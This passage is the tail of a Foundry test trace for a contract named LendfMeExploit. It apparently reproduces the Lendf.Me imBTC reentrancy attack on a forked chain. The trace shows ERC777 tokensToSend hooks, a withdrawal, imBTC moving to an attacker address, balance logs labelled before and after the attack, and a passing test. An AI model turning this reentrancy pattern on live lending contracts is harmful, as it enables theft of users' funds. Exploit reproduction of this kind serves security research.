    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   └─ ← [Return] 29134710219 [2.913e10]
    │   ├─ [2969] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   ├─ [1915] 0xE171D8c7e9EE0DDAe1A9bec0c7f35294e48c28d4::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   ├─ [5221] 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549::getSupplyRate(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 29134688624 [2.913e10], 3529518 [3.529e6])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014608ab04
    │   ├─ [6382] 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549::getBorrowRate(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 29134688624 [2.913e10], 3529518 [3.529e6])
    │   │   ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   │   └─ ← [Return] 29134710219 [2.913e10]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000146b8798c
    │   ├─ [13360] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::transfer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21595 [2.159e4])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─ emit Sent(operator: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, from: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, to: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 21595 [2.159e4], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, to: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 21595 [2.159e4])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─  storage changes:
    │   │   │   @ 0x23cd5fb27dba5566c2b842d5800732c71976b323e023aaad302231f5b1359c62: 0x00000000000000000000000000000000000000005e23aaddbadf383d4910f1e6 → 0x00000000000000000000000000000000000000005e23a64b100b5373f884f1e6
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000004929cf32e15a9280000 → 0x00000000000000000000000000000000000000000000092547c712def9b40000
    │   │   └─ ← [Return] true
    │   ├─ emit SupplyWithdrawn(: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x3212b29E33587A00FB1C83346f5dBFA69A458923, : 21595 [2.159e4], : 21595 [2.159e4], : 0)
    │   ├─  storage changes:
    │   │   @ 0xfecfd3b695cab06e789b541836c6501d818a5bb52531086cc2ac3bddbd420d91: 21595 → 0
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba92: 0x0000000000000000000000000000000000000000000000000000000146b8797b → 0x0000000000000000000000000000000000000000000000000000000146b8798c
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba8e: 0x00000000000000000000000000000000000000000000000000000006c42db4d9 → 0x00000000000000000000000000000000000000000000000000000006c42d607e
    │   └─ ← [Return] 0
    ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 43189 [4.318e4]
    ├─ [17850] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::transfer(0xA9BF70A420d364e923C74448D9D817d3F2A77822, 43189 [4.318e4])
    │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   └─ ← [Return] LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   ├─ [1669] LendfMeExploit::tokensToSend(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xA9BF70A420d364e923C74448D9D817d3F2A77822, 43189 [4.318e4], 0x, 0x)
    │   │   └─ ← [Stop]
    │   ├─ emit Sent(operator: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xA9BF70A420d364e923C74448D9D817d3F2A77822, amount: 43189 [4.318e4], data: 0x, operatorData: 0x)
    │   ├─ emit Transfer(from: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xA9BF70A420d364e923C74448D9D817d3F2A77822, value: 43189 [4.318e4])
    │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0xA9BF70A420d364e923C74448D9D817d3F2A77822, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─  storage changes:
    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000092547c712def9b40000 → 0
    │   │   @ 0x03ec19c00a17b0b4096d5f9d0a782ea0a8e791460d2fb914b1079745118347ce: 0 → 0x00000000000000000000000000000000000000000000092547c712def9b40000
    │   └─ ← [Return] true
    ├─ emit log_string(val: "--------------------------------------------------------------")
    ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea) [staticcall]
    │   └─ ← [Return] 29134688624 [2.913e10]
    ├─ emit log_named_uint(key: "[After Attack]Victim imBTC Balance : ", val: 29134688624 [2.913e10])
    ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0xA9BF70A420d364e923C74448D9D817d3F2A77822) [staticcall]
    │   └─ ← [Return] 43189 [4.318e4]
    ├─ emit log_named_uint(key: "[After Attack]Attacker imBTC Balance : ", val: 43189 [4.318e4])
    ├─  storage changes:
    │   @ 0xfecfd3b695cab06e789b541836c6501d818a5bb52531086cc2ac3bddbd420d92: 0 → 0x0000000000000000000000000000000000000000000000000de9d524b8318046
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 34.05s (31.59s CPU time)

Ran 2 test suites in 35.81s (35.54s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
